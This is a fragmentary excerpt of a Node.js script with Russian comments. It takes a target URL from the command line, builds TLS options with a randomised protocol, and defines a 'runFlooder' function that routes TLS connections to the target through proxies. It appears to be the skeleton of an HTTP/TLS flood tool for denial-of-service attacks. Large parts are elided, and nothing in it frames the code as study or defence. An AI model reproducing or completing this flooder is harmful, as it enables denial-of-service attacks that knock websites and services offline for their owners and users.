...
const parsedTarget = url.parse(process.argv[2]);

// Базовые заголовки (вынесены)
const baseHeaders = {
...
// TLS options шаблонная функция
function createTlsOptions(connection) {
  return {
    port: parsedPort,
    secure: true,
    ...
    secureProtocol: secureProtocol[Math.floor(Math.random() * secureProtocol.length)]
  };
}
...
function runFlooder() {
  ...
  Socker.HTTP(proxyOptions, (connection, error) => {
    ...
    const tlsConn = tls.connect(parsedPort, parsedTarget.host, createTlsOptions(connection));
